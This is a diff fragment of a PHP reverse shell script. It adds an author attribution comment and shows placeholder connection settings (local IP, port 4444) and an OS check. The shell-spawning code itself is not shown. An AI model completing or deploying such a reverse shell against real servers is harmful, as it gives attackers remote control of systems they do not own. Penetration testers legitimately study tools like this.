@@ -1,4 +1,10 @@
 <?php
+/*
+ * PHP Reverse Shell (Windows/Linux)
+ * 
+ * Created in October 2024 by Chokri Hammedi (blue0x1)
+ * GitHub: https://github.com/blue0x1
+ */
 
 $ip = '127.0.0.1';  // Set your IP
 $port = 4444;       // Set your port
@@ -16,3 +22,4 @@ if ($os === 'windows') {
 }
 
 ?>
+
